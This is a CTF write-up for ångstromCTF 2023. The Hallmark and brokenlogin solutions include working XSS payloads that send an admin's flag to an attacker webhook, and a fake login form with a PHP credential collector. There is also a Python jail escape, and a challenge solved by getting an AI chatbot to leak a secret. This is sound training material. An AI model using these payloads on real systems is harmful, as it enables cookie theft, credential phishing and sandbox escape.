---
layout: post
category: writeups
title: "ångstromCTF 2023"
date: 2023-04-27
ctf_categories:
  - misc
  - web
  - crypto
  - rev
  - pwn
---

<script src="{{ "/assets/vendor/highlightjs/build/languages/erlang.min.js" | prepend: site.baseurl }}"></script>
<script src="{{ "/assets/vendor/highlightjs/build/languages/elixir.min.js" | prepend: site.baseurl }}"></script>

# Misc

## Physics HW

> _My physics teacher also loves puzzles. Maybe my homework is a puzzle too?_<br>
> _Attachments: physics_hw.png_

As the image didn't seem to have any artifacts, if not for the blank space at the bottom, we tried some common tools.

After some tries, `zsteg --lsb physics_hw.png` gave us the flag that was encoded in the least significat bits.

🏁 _actf{physics_or_forensics}_{: .spoiler}

## Admiral Shark

> _I have been snooping on the conversations of my elusive enemies. See if you can help me gather the information I need to defeat them once and for all._<br>
> _Attachments: admiral_shark.pcapng_

Looking at the capture with WireShark, there's a clear-text communication on port 1245. Following the stream, in the packet 91 there is a zip file.

After extracting the zip archive from the capture, `unzip` isn't able to unzip it as there seems to be some errors.

Therefore, I tried extracting as much as possible with `binwalk`. Indeed, the flag was in one of the extracted files.

```bash
$ ack actf
_shark.raw.extracted/xl/sharedStrings.xml
...
```

🏁 _actf{wireshark_in_space}_{: .spoiler}

## Simon Says

> _This guy named Simon gave me a bunch of tasks to complete and not a lot of time. He wants to run a unique zoo but needs the names for his animals. Can you help me?_<br>
> _nc challs.actf.co xxxxx_

Connecting to the challenge presented you with a series of prompts like these, the entirety of which you had to solve before a global 3s timeout closed the connection:

```plaintext
Combine the first 3 letters of zebra with the last 3 letters of donkey
> zebkey
Combine the first 3 letters of wombat with the last 3 letters of bear
> womear
[...]
```

With a little help from pwntools to automate the connection this was an easy task:

```python
import re
from pwn import *

conn = remote('challs.actf.co', xxxxx)

while True:
    prompt = conn.recvline().decode('ascii')
    if 'actf{' in prompt:
        print(f"!!! {prompt.strip()}")
        break
    else:
        print(f">>> {prompt.strip()}")

    tokens = re.search(r"Combine the first ([0-9]+) letters of ([a-z]+) with the last ([0-9]+) letters of ([a-z]+)", prompt)
    if len(tokens.groups()) != 4:
        break

    reply = f'{tokens.group(2)[:int(tokens.group(1))]}{tokens.group(4)[-int(tokens.group(3)):]}'
    print(f"<<< {reply}")
    conn.send((reply + '\n').encode('ascii'))

conn.close()
```

```plaintext
[+] Opening connection to challs.actf.co on port xxxxx: Done
>>> Combine the first 3 letters of fish with the last 3 letters of lion
<<< fision
[...]
>>> Combine the first 3 letters of vulture with the last 3 letters of lion
<<< vulion
!!! actf{simon_says_you_win}
[*] Closed connection to challs.actf.co port xxxxx
```

🏁 _actf{simon_says_you_win}_{: .spoiler}

## better me

> _With the power of ARTIFICIAL INTELLIGENCE, I can replace myself!! Ask your questions to this guy, instead._<br>
> _https://xxxxx.actf.co/_

DISCLAIMER: the born2scan disassociates itself from any kind of bullying or verbal violence! _against humans :)_{: .spoiler}

![better_me](/assets/img/AngstromCTF_2023/better_me.png)

🏁 _actf{i_wouldnt_leak_the_flag_4f9a6ec9}_{: .spoiler}

## Obligatory

> _"angstrom needs a pyjail" - kmh11_<br>
> _nc challs.actf.co xxxxx_<br>
> _Attachments: jail.py, Dockerfile_

This challenge was very difficult but at the same time gave me great satisfaction in solving it. Before this challenge I was totally inexperienced about pyjails so I decided to read a lot of writeups of past challenges to get an idea of common solutions. After a few hours of reading I learnt many methods to bypass filters and constraints but nothing usable for this challenge. We are provided with the following source code:

```c:source.c
#!/usr/local/bin/python
cod = input("sned cod: ")

if any(x not in "q(jw=_alsynxodtg)feum'zk:hivbcpr" for x in cod):
    print("bad cod")
else:
    try:
        print(eval(cod, {"__builtins__": {"__import__": __import__}}))
    except Exception as e:
        print("oop", e)
```

We can only use lowercase letters and these `()=:'` symbols. Moreover we do not have any builtins except for \_\_import\_\_. So we need to overcome three main constraints:

- Get access again to the builtins (or find another way around)
- Execute multiple instructions without `;` or `\n`
- Get a RCE without using the `.` to call functions

The first constraint alone is easy to bypass because we can import whatever we want, also the builtins. But obviously this alone is not sufficient. I spent a lot time thinking to what we could do with `:` symbol and I came up with two things: walrus operator and lambda functions. I felt that I was on the right path but I didn't manage to put everything together. So I decided to focus on searching a method to execute multiple expressions only with `()=:'`. After a while something clicked and I realized that I could use the `==` operator to execute multple expressions! Furthermore with the walrus operator we can assign inside expressions. So I thought I had the solution and tried with:

```python
(__builtins__:=__import__('os'))==print('test')
```

But it failed :( (oop name 'print' is not defined). \\
I was still missing something. At that point I was so close (and desperate) that I tried everything I could, ending up with this solution using a lambda function:

```python
(__builtins__:=__import__('builtins'))==(lambda:exec(input()))()
```

So after the CTF, while reading other writeups, I found out why this works: in python 3.10+, functions store their own builtins, which are pulled from globals["__builtins__"] when the function is created, meaning the lambda can use the modified builtins.

🏁 _actf{c0uln7_g3t_1t_7o_w0rk_0n_python39_s4dge}_{: .spoiler}

# Web

## catch me if you can

> _Somebody help!_<br>
> _https://catch-me-if-you-can.web.actf.co/_

![catch me if you can](/assets/img/AngstromCTF_2023/catch-me-if-you-can.gif){: .image-66}

Some text is spinning on the page and it seems to be the flag. Ok, let's dig into html source code.

```html
<body>
    <h1>catch me if you can!</h1>
    <marquee scrollamount="50" id="flag">actf{REDACTED}</marquee>
</body>
```

Yep, it was the flag. Quite straightforward.

🏁 _actf{y0u_caught_m3!_0101ff9abc2a724814dfd1c85c766afc7fbd88d2cdf747d8d9ddbf12d68ff874}_{: .spoiler}

## Celeste Speedrunning Association

> _I love Celeste Speedrunning so much!!! It's so funny to watch!!! Here's my favorite site!_<br>
> _https://mount-tunnel.web.actf.co/_

We have to beat other players by playing at Celeste speedrun game. The main page shows us the scoreboard.

```html
Welcome to Celeste speedrun records!!!<br>
Current record holders (beat them at <current URL>/play for a flag!):
<ol>
    <li>Old Lady: 0 seconds</li>
    <li>Madeline: 10 seconds</li>
    <li>Badeline: 10.1 seconds</li>
</ol>
```

Looking at `/play` source code, we need to send a `start` value to `/submit` in order to play.

```html
<form action="/submit" method="POST">
    <input type="text" style="display: none;" value="1682636300.7767162" name="start" />
    <input type="submit" value="Press when done!" />
</form>
```

The goal is to click the button as fast as we can... or change the `start` value. We can turn it into the current timestamp and add a few seconds. This way our speedrun time will be negative. Easy win.

```python
import time
import requests

url = 'https://mount-tunnel.web.actf.co/submit'

data = {
    'start': time.time() + 5
}

r = requests.post(url, data=data)
print(r.text)
```

🏁 _actf{wait_until_farewell_speedrun}_{: .spoiler}

## shortcircuit

> _Bzzt_<br>
> _https://shortcircuit.web.actf.co/_

There's a simple login form on the main page. Looking at the html source code, we notice a JS script.

```javascript
const swap = (x) => {
    let t = x[0]
    x[0] = x[3]
    x[3] = t

    t = x[2]
    x[2] = x[1]
    x[1] = t

    t = x[1]
    x[1] = x[3]
    x[3] = t

    t = x[3]
    x[3] = x[2]
    x[2] = t

    return x
}

const chunk = (x, n) => {
    let ret = []

    for(let i = 0; i < x.length; i+=n){
        ret.push(x.substring(i,i+n))
    }

    return ret
}

const check = (e) => {
    if (document.forms[0].username.value === "admin"){
        if(swap(chunk(document.forms[0].password.value, 30)).join("") == "7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7"){
            location.href="/win.html"
        }
        else{
            document.getElementById("msg").style.display = "block"
        }
    }
}
```

Seems like some characters of the flag have been swapped. Using a reverse swap function, we can retrieve it in its normal form and print it.

```javascript
const swap_rev = (x) => {
    let t;

    t = x[2]
    x[2] = x[3]
    x[3] = t

    t = x[3]
    x[3] = x[1]
    x[1] = t

    t = x[1]
    x[1] = x[2]
    x[2] = t

    t = x[3]
    x[3] = x[0]
    x[0] = t

    return x
}

const chunk = (x, n) => {
    let ret = []

    for(let i = 0; i < x.length; i+=n){
        ret.push(x.substring(i,i+n))
    }

    return ret
}

let x = '7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7';
let flag = swap_rev(chunk(x, 30)).join("");

console.log(flag);
```

🏁 _actf{cl1ent_s1de_sucks_544e67e6317199e454f4d2bdb04d9e419ccc7f12024523398ee02fe7517fffa92517e08250c4aaa9ed206fd7c9e398e2}_{: .spoiler}

## directory

> _This is one of the directories of all time, and I would definitely rate it out of 10._<br>
> _https://directory.web.actf.co/_

Searching through a 5000 list of html pages, the goal is to find the one where the flag is hidden.

```html
<html>
    <body>
        <a href="0.html">page 0</a><br />
        <a href="1.html">page 1</a><br />
        <a href="2.html">page 2</a><br />
        <a href="3.html">page 3</a><br />
        <a href="4.html">page 4</a><br />
        <a href="5.html">page 5</a><br />
        <a href="6.html">page 6</a><br />

        <!-- [...] -->
```

A simple Python script can do this for us.

```python
import requests
from pwn import *
import time

url = 'https://directory.web.actf.co/{}.html'
p = log.progress('directory')

for i in range(0, 5000):
    r = requests.get(url.format(i))
    out = r.text

    p.status(f'{i}.html - {out}')

    if 'your flag is in another file' not in out:
        break

    time.sleep(1)
```

🏁 _actf{y0u_f0und_me_b51d0cde76739fa3}_{: .spoiler}

## Celeste Tunnelling Association

> _Welcome to the tunnels!! Have fun!_<br>
> _https://pioneer.tailec718.ts.net/_<br>
> _Attachments: server.py_

From `server.py`, we can see how the server works.

```python
# run via `uvicorn app:app --port 6000`
import os

SECRET_SITE = b"flag.local"
FLAG = os.environ['FLAG']

async def app(scope, receive, send):
    headers = scope['headers']

    # [...]

    # IDK malformed requests or something
    num_hosts = 0
    for name, value in headers:
        if name == b"host":
            num_hosts += 1

    if num_hosts == 1:
        for name, value in headers:
            if name == b"host" and value == SECRET_SITE:
                await send({
                    'type': 'http.response.body',
                    'body': FLAG.encode(),
                })
                return

    # [...]
```

If we set the `host` header to `flag.local`, we will retrieve the flag.

```python
import requests

url = 'https://pioneer.tailec718.ts.net/'
headers = {
    'host': 'flag.local'
}

r = requests.get(url, headers=headers)
print(r.text)
```

🏁 _actf{reaching_the_core__chapter_8}_{: .spoiler}

## Hallmark

> _Send your loved ones a Hallmark card! Maybe even send one to the admin 😳._<br>
> _https://hallmark.web.actf.co/, https://admin-bot.actf.co/hallmark_<br>
> _Attachments: dist.tar.gz_

Starting with the description of the challenge, we know what the goal is to create some cards and send them to the admin. There's the possibility to put images into them, choosing from a predefined list of 4. Otherwise, a custom text is accepted. Moreover, from app source code we see that `/flag` is accessible only from admin. XSS flavour around here, do you feel it?

```javascript
// the admin bot will be able to access this
app.get("/flag", (req, res) => {
    if (req.cookies && req.cookies.secret === secret) {
        res.send(flag);
    } else {
        res.send("you can't view this >:(");
    }
});
```

From `/card` we can create new cards, edit or print them. The server sets the right `content-type` header to print a card based on its content, which can be text or a SVG image.

```javascript
app.get("/card", (req, res) => {
    if (req.query.id && cards[req.query.id]) {
        res.setHeader("Content-Type", cards[req.query.id].type);
        res.send(cards[req.query.id].content);
    } else {
        res.send("bad id");
    }
});
```

The first idea could be simply to create a card by putting some javascript code as custom text and submit the link to the admin. There's a problem: the response `content-type` header will be set to `text/plain`. Instead, if we set `svg` other than `text`, our custom text won't be considered at all.

```javascript
app.post("/card", (req, res) => {
    let { svg, content } = req.body;

    let type = "text/plain";
    let id = v4();

    if (svg === "text") {
        type = "text/plain";
        cards[id] = { type, content }
    } else {
        type = "image/svg+xml";
        cards[id] = { type, content: IMAGES[svg] }
    }

    res.redirect("/card?id=" + id);
});
```

Looking into card edit method, we can see a poorly constructed equality check: `type == "image/svg+xml"`.

```javascript
app.put("/card", (req, res) => {
    let { id, type, svg, content } = req.body;

    if (!id || !cards[id]){
        res.send("bad id");
        return;
    }

    cards[id].type = type == "image/svg+xml" ? type : "text/plain";
    cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;
});
```

Knowing that `type` attribute is used to set the `content-type` header and that
JS is a beautiful language

```javascript
'test' == ['test']  //true
'test' === ['test'] //false
```

we could try to create a new card and edit it by setting `type` to

```plaintext
['image/svg+xml']
```

and `content` to

```xml
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
        alert(1);
   </script>
</svg>
```

This way we can inject custom SVG payload and run a JS script since `content-type` header will be `image/svg+xml`. Let's see if it can work.

![hallmarket XSS](/assets/img/AngstromCTF_2023/hallmark-xss.png){: .image-66}

Ok, now we can create the real payload. The admin will do a request to `/flag` and will send the flag to us. We can use webhook to intercept the response. A final Python script could be

```python
import requests

webhook = 'https://my-unique-webhook-url'
print(f'#1: webhook: {webhook}')

url = 'https://hallmark.web.actf.co/card'

post_data = {
    'svg': 'text',
    'content': 'text'
}

r = requests.post(url, data=post_data, allow_redirects=False)
my_card_id = r.headers['Location'].split('=')[1]
print(f'#2: id = {my_card_id}')

content = '''
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
        var xmlHttp = new XMLHttpRequest();

        xmlHttp.onreadystatechange = function() {
            if(xmlHttp.status == 200) {
                flag = xmlHttp.responseText;
                document.location = "''' + webhook + '''?p=" + flag;
            }
        }

        xmlHttp.open("GET", '/flag', true);
        xmlHttp.send();
   </script>
</svg>
'''

put_data = {
    'id': my_card_id,
    'type[]': ['image/svg+xml'],
    'svg': '',
    'content': content
}

r = requests.put(url, data=put_data)

if r.text == 'ok':
    print(f'#3: Go to "https://admin-bot.actf.co/hallmark" and put "{url}?id={my_card_id}"')
else:
    print('Error')
```

🏁 _actf{the_adm1n_has_rece1ved_y0ur_card_cefd0aac23a38d33}_{: .spoiler}

## brokenlogin

> _Talk about a garbage website... I don't think anybody's been able to log in yet! If you find something, make sure to let the admin know._<br>
> _https://brokenlogin.web.actf.co/, https://admin-bot.actf.co/brokenlogin_<br>
> _Attachments: app.py, brokenlogin.js_

From `app.py` we know that `message` argument can be printed if we pass it to the main page, but only if its content is no longer than 25 characters.

```python
# [...]

indexPage = """
<html>
    <head>
        <title>Broken Login</title>
    </head>
    <body>
        <p style="color: red; fontSize: '28px';">%s</p>
        <p>Number of failed logins: {% raw %} {{ fails }} {% endraw %}</p>
        <form action="/" method="POST">
            <label for="username">Username: </label>
            <input id="username" type="text" name="username" /><br /><br />

            <label for="password">Password: </label>
            <input id="password" type="password" name="password" /><br /><br />

            <input type="submit" />
        </form>
    </body>
</html>
"""

@app.get("/")
def index():
    global fails
    custom_message = ""

    if "message" in request.args:
        if len(request.args["message"]) >= 25:
            return render_template_string(indexPage, fails=fails)

        custom_message = escape(request.args["message"])

    return render_template_string(indexPage % custom_message, fails=fails)

# [...]
```

We can try to send a template injection to see if the web app is vulnerable, for example {% raw %} `{{7*3}}` {% endraw %}

![brokenlogin injection](/assets/img/AngstromCTF_2023/brokenlogin-1.png){: .image-66}

We can see a `21`, so `7*3` has been evaluated. Now, let's get into admin bot source code. The admin will load the page sended by the user (only if the url is from ctf domain) and fill out a form with username and the flag as password.

```javascript
module.exports = {
    /* [...] */

    async execute(browser, url) {
        /* [...] */

        const page = await browser.newPage();
        await page.goto(url);

        await page.waitForSelector("input[name=username]");

        await page.$eval(
          "input[name=username]",
          (el) => (el.value = "admin")
        );

        await page.waitForSelector("input[name=password]");

        await page.$eval(
          "input[name=password]",
          (el, password) => (el.value = password),
          process.env.CHALL_BROKENLOGIN_FLAG
        );

        await page.click("input[type=submit]");

        /* [...] */
    },
};
```

The idea could be to create a fake form hosted with ngrok and use the template injection to perform a javascript redirect to our fake form. Let's try to get an XSS injection. First, there are two main problems to solve: payload length under 25 chars and `message` escaping. We can pass a second argument to the page and call it from `message` argument to bypass payload length constraint and escaping. We can try with

```plaintext
p=<script>alert(1)</script>&message={% raw %}{{request.args.p}}{% endraw %}
```

Doesn't seem to work. The template engine escapes strings by default. We know that flask framework uses jinja2 as template engine, which has the `safe` keyword to disable escaping. Let's try with

```plaintext
p=<script>alert(1)</script>&message={% raw %}{{request.args.p|safe}}{% endraw %}
```

Now it works. Using the JS property `document.location`, we can create our final payload.

```plaintext
p=<script>document.location='http://my.ngrok.ip'</script>&message={% raw %}{{request.args.p|safe}}{% endraw %}
```

and then the link we will submit to the admin

```plaintext
https://brokenlogin.web.actf.co/?p=<script>document.location='http://my.ngrok.ip'</script>&message={% raw %}{{request.args.p|safe}}{% endraw %}
```

We can handle the flag with a simple `save.php` script

```php
<?php
    $flag = $_POST['password'];
    $myfile = fopen("flag.txt", "w") or die("Unable to open file!");

    fwrite($myfile, $flag);
    fclose($myfile);

    echo "ok!";
```

which is executed after the submission of the fake form

```html
<html>
    <head>
        <title>Exploit</title>
    </head>
    <body>
        <form action="save.php" method="POST">
            <label for="username">Username: </label>
            <input id="username" type="text" name="username" /><br /><br />

            <label for="password">Password: </label>
            <input id="password" type="password" name="password" /><br /><br />

            <input type="submit" />
        </form>
    </body>
</html>
```

🏁 _actf{adm1n_st1ll_c4nt_l0g1n_11dbb6af58965de9}_{: .spoiler}

# Crypto

## ranch

> _Caesar dressing is so 44 BC..._<br>
> _`rtkw{cf0bj_czbv_nv'cc_y4mv_kf_kip_re0kyvi_uivjj1ex_5vw89s3r44901831}`_<br>
> _Attachments: ranch.py_

As the name implies, this is a ROT encoding. Using 9 rotations we get the flag. Quick points!

🏁 _actf{lo0ks_like_we'll_h4ve_to_try_an0ther_dress1ng_5ef89b3a44901831}_{: .spoiler}

## impossible

> _Is this challenge impossible?_<br>
> _nc challs.actf.co xxxxx_<br>
> _Attachments: impossible.py_

If we interact with the server, it will ask:
"Supply positive x and y such that x < y and x > y".
We can understand how the check is done by looking at the source code:

```python
if len(fake_psi(one_encoding(x, 64), zero_encoding(y, 64))) == 0 and x > y and x > 0 and y > 0:
    print(open("flag.txt").read())
```

Let's breakdown this code:

```python
def one_encoding(x, n): # encodes x
    ret = []
    for i in range(n):
        if x & 1:
            ret.append(x)

        x >>= 1
    return ret
```

```python
def zero_encoding(x, n): # encodes y
    ret = []
    for i in range(n):
        if (x & 1) == 0:
            ret.append(x | 1)
        x >>= 1
    return ret
```

```python
def fake_psi(a, b):
    return [i for i in a if i in b]
```

A bitwise AND between our input and 1 is done n times and every time our input is shifted by one bit on the right (removing the LSB).

-> 64 is the number of bits that will be checked.

Our solution was to find a way to make both one_encoding and zero_encoding return empty lists, so that also fake_psy returns an empty list.

How do we find x?
We have to choose an x that has got the last 64 bits = 0 so that the condition ``if x & 1:`` is always false.
The candidate for x is 2 ** 64, since this is its binary representation:
``10000000000000000000000000000000000000000000000000000000000000000``

Then, we find y using a similar approach: the last 64 binary digit must be = 1, so that the condition ``if (x & 1) == 0`` will always be false.
y will be (2 ** 64)-1, since its binary representation is:
``01111111111111111111111111111111111111111111111111111111111111111``

🏁 _actf{se3ms_pretty_p0ssible_t0_m3_7623fb7e33577b8a}_{: .spoiler}

## Lazy Lagrange

> _Lagrange has gotten lazy, but he's still using Lagrange interpolation...or is he?_<br>
> _nc challs.actf.co xxxxx_<br>
> _Attachments: lazylagrange.py_

The challenge provide us with the source code of the challenge.

```python:source.py
#!/usr/local/bin/python
import random

with open('flag.txt', 'r') as f:
    FLAG = f.read()

assert all(c.isascii() and c.isprintable() for c in FLAG), 'Malformed flag'
N = len(FLAG)
assert N <= 18, 'I\'m too lazy to store a flag that long.'
p = None
a = None
M = (1 << 127) - 1  # 2^127-1


def query1(s):
    if len(s) > 100:
        return 'I\'m too lazy to read a query that long.'
    x = s.split()
    if len(x) > 10:
        return 'I\'m too lazy to process that many inputs.'
    if any(not x_i.isdecimal() for x_i in x):
        return 'I\'m too lazy to decipher strange inputs.'
    x = (int(x_i) for x_i in x)
    global p, a
    # shuffle the range 1-N
    p = random.sample(range(N), k=N)
    # shuffle flag with char as int
    a = [ord(FLAG[p[i]]) for i in range(N)]
    res = ''
    for x_i in x:
        res += f'{sum(a[j] * x_i ** j for j in range(N)) % M}\n'
    return res


# Compute sum(a[j])
query1('0')


def query2(s):
    if len(s) > 100:
        return 'I\'m too lazy to read a query that long.'
    x = s.split()
    if any(not x_i.isdecimal() for x_i in x):
        return 'I\'m too lazy to decipher strange inputs.'
    x = [int(x_i) for x_i in x]
    # pad input with 0
    while len(x) < N:
        x.append(0)
    z = 1
    for i in range(N):
        z *= not x[i] - a[i]
    return ' '.join(str(p_i * z) for p_i in p)


while True:
    try:
        choice = int(input(": "))
        assert 1 <= choice <= 2
        match choice:
            case 1:
                print(query1(input("\t> ")))
            case 2:
                print(query2(input("\t> ")))
    except Exception as e:
        print("Bad input, exiting", e)
        break
```

We can perform two queries:

- Query1: allow us to send one (or more) integer `x` and it computes the value of $$p(x)=\Sigma_{i=0}^{17} a_i \cdot x^i
$$
  where the $a_i$ are the ascii decimal values of the flag's characters.
- Query2: allow us to to send 18 integres values and if these are equal to the coefficients $a_i$ used in Query1 it prints their position in the flag.

So the query1 must be used to recover the flag characters and the query2 to recover their correct order.
My first idea was to use Langrange interpolation to find the coefficients $a_i$ but in query1 we can provide only 10 points and the flag has length=18, so we have not enough points to interpolate correctly. Then I realized that if I found a number $k$ such that:
$$
k^n > \Sigma_{i=0}^{n-1} 127*k^i \\
\forall n \in [1,17]
$$
then I would have been able to recover all the $a_i$. This is done, for each $a_i$, by subtracting from $p(k)$ the possible $a_{i_j}k^i$ ($j \in [0,127]$); the right $a_{i_j}$ is the highest such that $p(k)-a_{i_j}k^i \ge 0$.
Moreover we need that $p(k) \le M$ where $M=2^{127}-1$. A $k$ that satisfy all the constraints is `130`.

```python:solve.py
from pwn import *


def solve():
    r = remote('challs.actf.co', 32100)

    r.sendlineafter(': ', b'1')
    r.sendlineafter('> ', b'130')

    tot = int(r.recvline().strip().decode())
    tmp = tot

    coeff = []
    for i in range(18):
        for j in range(128):
            x = 130**(17-i)
            if tot-(x*j) <= 0:
                coeff.append(j-1)
                tot -= x*(j-1)
                break

    coeff = coeff[::-1]
    coeff[0] += 1
    res = sum(coeff[j] * 130 ** j for j in range(18))

    assert res == tmp
    payload = (' '.join([str(i) for i in coeff])).encode()

    r.sendlineafter(': ', b'2')
    r.sendlineafter('> ', payload)

    order = [int(i) for i in r.recvline().strip().decode().split()]
    print(order)
    print([chr(i) for i in coeff])
    print(''.join([chr(i[1]) for i in sorted(zip(order, coeff))]))


solve()
```

🏁 _actf{f80f6086a77b}_{: .spoiler}

## Royal Society of Arts

> _RSA strikes strikes strikes strikes again again again again!_<br>
> _Attachments: rsa.py, out.txt_

We are given a python program and the corresponding output. The python program looks like this:

```python
from Crypto.Util.number import getStrongPrime, bytes_to_long
f = open("flag.txt").read()
m = bytes_to_long(f.encode())
p = getStrongPrime(512)
q = getStrongPrime(512)
n = p*q
e = 65537
c = pow(m,e,n)
print("n =",n)
print("e =",e)
print("c =",c)
print("(p-2)*(q-1) =", (p-2)*(q-1))
print("(p-1)*(q-2) =", (p-1)*(q-2))
```

Other than `n,e` and `c` there are also `(p-2)(q-1)` and `(p-1)(q-2)` so we have two equations where we know the results. To decrypt RSA we need `p` and `q` so we can get them by solving a system of equation like so:

$$
\begin{equation}
    \begin{cases}
      (p-2)(q-1) = \text{number given}\\
      (p-1)(q-2) =\text{number given}\\
      p\cdot q = n
    \end{cases}
\end{equation}
$$

Solving this simple system with `sagemath` will give us `p` and `q`.
After that we can decrypt the message with:

$$
d = e^{-1} \mod (p-1)(q-1)
$$

and the flag:

$$
m = c^{d} \mod n
$$

converting `m` from long to bytes_string will give us the flag!

🏁 _actf{tw0_equ4ti0ns_in_tw0_unkn0wns_d62507431b7e7087}
_{: .spoiler}

# Rev

## checkers

> _Attachments: checkers_

A way to solve this challenge is to use the command "strings" on the binary file; the flag is not encoded in the binary.

-> Another solution is to open the file with Ghidra. In the main function we can see that a function ``strncmp`` is called, comparing our input with the flag.
In this way, we can see the flag looking at the decompiled code.

🏁 _actf{ive_be3n_checkm4ted_21d1b2cebabf983f}_{: .spoiler}

## zaza

> _Bedtime!_<br>
> _nc challs.actf.co xxxxx_<br>
> _Attachments: zaza_

If we interact with the remote service, it says: "I'm going to sleep. Count me some sheep: "
It seems like it wants a specific number. Let's try to open it with Ghidra to understand better.

In the main function:
First input (must be 4919 to continue with the execution):

```c
  printf("I\'m going to sleep. Count me some sheep: ");
  __isoc99_scanf(&%d,&input1);
  if (input1 != 4919) {
    puts("That\'s not enough sheep!");
    exit(1);
  }
```

Second input (we can send any number as long as it is not the inverse of 4919 (= input1):

```c
  printf("Nice, now reset it. Bet you can\'t: ");
  __isoc99_scanf(&%d,&input2);
  if (input2 * input1 == 1) {
    printf("%d %d",(ulong)local_5c,(ulong)(local_60 + local_5c));
    puts("Not good enough for me.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
```

Now the program asks us the magic word:

```c
  puts("Okay, what\'s the magic word?");
  getchar();
  fgets(input,64,stdin);
  sVar2 = strcspn(input,"\n");
  input[sVar2] = '\0';
  xor_((long)input);
  iVar1 = strncmp(input,"2& =$!-( <*+*( ?!&$$6,. )\' $19 , #9=!1 <*=6 <6;66#",0x32);
  if (iVar1 != 0) {
    puts("Nope");
    exit(1);
  }
  win();
```

If after the function `xor_` our input is equal to the string in the strncmp, the function win is called and we get the flag!
Let's breakdown the xor_ function:

```c
void xor_(char *param_1)
{
  size_t lenght;
  int i;
  i = 0;
  while( true ) {
    lenght = strlen("anextremelycomplicatedkeythatisdefinitelyuselessss");
    if (lenght <= (ulong)(long)i) break;
    input[i] = input[i] ^ "anextremelycomplicatedkeythatisdefinitelyuselessss"[i];
    i = i + 1;
  }
  return;
}
```

I reversed this function in python and found the correct word we must give to the program.

Here's the python script used to solve this challenge:

```python
from pwn import *
r = remote("challs.actf.co", 32760)
r.sendline(b'4919') # input1
r.sendline(b'1') # input2

s = "anextremelycomplicatedkeythatisdefinitelyuselessss"
target = "2& =$!-( <*+*( ?!&$$6,. )\' $19 , #9=!1 <*=6 <6;66#"
magic_word = ""
target = target.encode()
s = s.encode()

# reversed xor_ function
for i in range(len(s)):
    magic_word += chr(target[i] ^ s[i])

r.sendline(magic_word.encode()) # input3
r.interactive()
```

🏁 _actf{g00dnight_c7822fb3af92b949}_{: .spoiler}

## Bananas

> _A friend sent this to me. Can you help me find out what they want?_<br>
> _nc challs.actf.co xxxxx_<br>
> _Attachments: Elixir.Bananas.beam_

If we connect to the trhough netcat the server will ask `How many bananas do I have?` so we have to find how many bananas he needs.

We are given an `Elixir.Banans.beam` and if you are a little bit familiar with Elixir you will see that this is a compiled Earlang file for the Earlang VM.
The first thing I did was trying to execute the file, but strangely, it returns an error for the encoding when running it like so:

```shell
elixir Elixir.Bananas.beam
```

I tried running it with other strategies without success using the interactive elixir shell:

```shell
iex Elixir.Bananas.beam
```

So I had to use another strategy, maybe decompiling it?
Because of the fact that it's a beam bytecode I thought it will be a tool to decompile it so I found [this](https://elixirforum.com/t/need-help-decompiling-beam-file/45441/15) post from the elixir forum using the `niahoo/decompilerl`.

I created a new elixir project with

```shell
mix new myproject
```

And added in the `mix.exs` file I added the dependency:

```elixir
  defp deps do
    [
      {:decompilerl, github: "niahoo/decompilerl"}
      # {:dep_from_hexpm, "~> 0.3.0"},
      # {:dep_from_git, git: "https://github.com/elixir-lang/my_dep.git", tag: "0.1.0"}
    ]
  end
```

After that i created a file `tt.exs` in the root of the project and used the following code:

{:.linenumber}
```elixir
Code.append_path(File.cwd!())
Decompilerl.decompile(:Elixir_Bananas)
System.halt()
```

Note that in the second line we have to specify the file name so I had to rename `Elixir.Bananas.beam` to `Elixir_Bananas.beam` because with dots doesn't work.

Running the `tt.exs` file will return the decompiled earlang file:

```erlang
Retrieving code for Elixir_Bananas
-file("lib/bananas.ex", 1).

-module('Elixir.Bananas').

-compile([no_auto_import]).

-export(['__info__'/1, main/0, main/1]).

-spec '__info__'(attributes |
                 compile |
                 functions |
                 macros |
                 md5 |
                 exports_md5 |
                 module |
                 deprecated |
                 struct) -> any().

'__info__'(module) -> 'Elixir.Bananas';
'__info__'(functions) -> [{main, 0}, {main, 1}];
'__info__'(macros) -> [];
'__info__'(struct) -> nil;
'__info__'(exports_md5) ->
    <<"TÀ}ÏÚ|º6þ\020Í\f\035\005\222\203">>;
'__info__'(Key = attributes) ->
    erlang:get_module_info('Elixir.Bananas', Key);
'__info__'(Key = compile) ->
    erlang:get_module_info('Elixir.Bananas', Key);
'__info__'(Key = md5) ->
    erlang:get_module_info('Elixir.Bananas', Key);
'__info__'(deprecated) -> [].

check([_num@1, <<"bananas">>]) ->
    (_num@1 + 5) * 9 - 1 == 971;
check(__asdf@1) -> false.

convert_input(_string@1) ->
    to_integer('Elixir.String':split('Elixir.String':trim(_string@1))).

main() -> main([]).

main(_args@1) ->
    print_flag(check(convert_input('Elixir.IO':gets(<<"How many bananas do I have?\n">>)))).

print_flag(false) -> 'Elixir.IO':puts(<<"Nope">>);
print_flag(true) ->
    'Elixir.IO':puts('Elixir.File':'read!'(<<"flag.txt">>)).

to_integer([_num@1, _string@1]) ->
    [erlang:binary_to_integer(_num@1), _string@1];
to_integer(_list@1) -> _list@1.
```

Althought I've never seen earlang code we see that there is a suspicious line where there is an operation made with `num@1` wich I guess is part of the input:

```erlang
    (_num@1 + 5) * 9 - 1 == 971;
```

it will return true only if the operation returns `971` so using my math super skills I reversed the equation and got `103`.
But using `103` as the input on the server doesn't work why?

Looking more closely to the code we see that the check is for `num@1` and `"bananas"`. So maybe my input as to be `103 bananas`...

Yes! That was it, using this input the server returns the flag

🏁 _actf{baaaaannnnananananas_yum}_{: .spoiler}

# Pwn

## queue

> _I just learned about stacks and queues in DSA!_<br>
> _nc challs.actf.co xxxxx_<br>
> _Attachments: queue_

